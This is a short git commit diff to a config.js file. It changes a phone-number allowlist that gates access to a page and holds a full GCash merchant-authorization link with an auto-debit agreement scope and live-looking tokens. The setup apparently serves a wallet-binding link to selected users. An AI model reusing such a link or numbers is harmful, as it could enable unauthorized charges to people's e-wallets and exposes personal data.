07ceed8c1ef6a954734a952e30ea5bd9e6d6bd8b
Grocery Assistance <help.tala@gmail.com>
2026-03-26 16:43:42 +0800

    Update config.js

--- config.js
+++ config.js
@@ -1,7 +1,7 @@
 // Dito mo lang ilalagay ang mga number na PWEDENG pumasok sa main.html
 const ALLOWED_NUMBERS = [
     '09103827144',
-    '09123456789'
+    '09053351911'
 ];
 
 const LATEST_GCASH_URL = "https://m.gcash.com/gcashapp/gcash-merchants-auth/index.html?acqSiteId=2071216300000000&clientId=2018062511204800000679&merchantId=2163400000000013&merchantName=LAZADA&netAuthId=2026032619074400000390018275653&paySiteId=1022170000000000000&redirectUrl=https://open-ph.alipay.com/api/alipay/channel/gn/gcashmini/binding-callback.htm&scopes=AUTH_AGREEMENTPAY&state=2026032619031313002619045308892&terminalType=WEB&signature=$sign#/";
